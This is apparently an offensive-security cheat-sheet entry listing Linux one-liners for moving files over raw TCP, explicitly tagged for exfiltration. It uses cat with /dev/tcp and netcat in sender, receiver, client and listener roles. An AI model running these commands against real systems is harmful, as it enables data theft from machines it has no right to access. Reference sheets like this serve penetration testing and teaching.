# FileTransfer-TCP

% file transfer, exfiltration, injecton

#plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 

## cat - receiver
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
cat < /dev/tcp/<ip>/<port> > <file>
```

## cat - sender
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
cat <file> > /dev/tcp/<ip>/<port>
```
## nc - receiver/client
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nv <ip> <port> > <file>
```

## nc - receiver/server
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nlvp <port> > <file>
```

## nc - sender/client
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nv <ip> <port> < <file>
```

## nc - sender/server
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nlvp <port> < <file>
```
